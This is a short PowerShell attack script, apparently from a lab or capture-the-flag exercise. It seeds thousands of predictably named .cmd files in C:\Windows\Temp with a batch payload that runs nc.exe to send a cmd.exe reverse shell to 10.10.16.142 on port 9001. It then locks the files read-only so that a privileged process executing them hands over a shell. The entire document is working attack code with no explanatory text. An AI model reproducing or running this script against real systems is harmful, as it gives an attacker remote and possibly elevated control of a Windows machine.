# 1. Define your correct IP and Port
$LHOST = "10.10.16.142" 
$LPORT = "9001"
$NcPath = "C:\Windows\Temp\nc.exe"

# 2. Create the payload content
$BatchPayload = "@echo off`r`n$NcPath -e cmd.exe $LHOST $LPORT"

# 3. Force-Seed the files again (Overwrite existing)
Write-Host "Reseeding files with IP $LHOST..."
foreach ($ctr in 0..1) {
    for ($num = 1000; $num -le 15000; $num++) {
        $filePath = "C:\Windows\Temp\cmk_all_$($num)_$($ctr).cmd"
        try {
            # Force remove read-only if exists so we can overwrite
            if (Test-Path $filePath) { Set-ItemProperty -Path $filePath -Name IsReadOnly -Value $false }
            
            [System.IO.File]::WriteAllText($filePath, $BatchPayload, [System.Text.Encoding]::ASCII)
            Set-ItemProperty -Path $filePath -Name IsReadOnly -Value $true
        } catch {}
    }
}
Write-Host "Done."
